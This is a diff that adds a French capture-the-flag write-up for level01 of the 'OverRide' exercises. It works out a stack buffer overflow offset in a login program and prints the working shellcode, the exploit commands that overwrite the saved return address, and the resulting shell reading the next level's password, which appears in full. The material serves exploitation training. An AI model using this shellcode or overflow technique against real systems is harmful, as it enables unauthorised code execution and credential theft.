@@ -1,0 +1,31 @@
+Commencons a creer le source.
+
+Dans notre programme nous avons une string declaree dans le main. Et des autres dans la section .bss. Depuis le .bss on ne peut rien faire avec ce programme.
+Mon on peur faire un overflow avec la string declaree dans le main par contre.
+
+A [ebp + 0x4] on retrouve notre sauvgarde de EIP. esp + 0x60+ 2 *0x4 (push) + 0x4 = ebp + 0x4.
+Donc EIP sauvgarde se trouve a esp + 0x6c.
+Notre chaine de caractere declaree dans le main se trouve a esp + 0x1c. La function fgets lui copie jusqu'a 0x64 caracteres. 0x1c + 0x64 = 0x80.
+0x80 > 0x6c donc on peut largement ecrire sur la valeur EIP sauvgardee.
+
+Calcul offset:
+	0x6c - 0x1c = 0x50
+
+Pour acceder au fgets qui va remplir notre buffer on doit entrer un login, qui doit commencer par "dat_wil".
+Puis maintenant on peut lui donner une string de 0x50 + 0x4 pour ecraser EIP.
+Le SHELLCODE est generee par GDB, il va etre placee dans l'environement. Puis on va utiliser notre getenvaddr pour rechercher l'adresse exacte de notre SHELLCODE
+
+
+level01@OverRide:~$ USER=$(python -c 'print "\x30\xf9\xff\xbf\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
+level01@OverRide:~$ ./getenvaddr "USER" "./level01"
+USER will be at 0xffffd934
+level01@OverRide:~$ (python -c 'print "dat_wil "'; python -c 'print "."*0x50 + "\x33\xd9\xff\xff"' ; cat -) |./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
+####### De temps en temps il y a un petit decalage de 0x1 entre le retour de notre prog getenvaddr et la vraie valeur. ########
